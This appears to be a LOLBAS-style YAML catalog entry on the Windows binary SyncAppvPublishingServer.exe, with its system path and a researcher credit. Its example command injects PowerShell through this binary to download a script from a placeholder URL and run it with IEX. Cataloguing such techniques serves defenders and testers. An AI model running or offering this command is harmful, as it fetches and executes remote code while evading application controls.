---
name: syncappvpublishingserver.exe
description: 
functions:
  execute:
    - description: Example command on how inject Powershell code into the process
      code: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
resources: 
    - resource: https://twitter.com/monoxgas/status/895045566090010624
fullpath: 
    - path: c:\windows\system32\SyncAppvPublishingServer.exe
notes: Thanks to Nick Landers - @monoxgas
---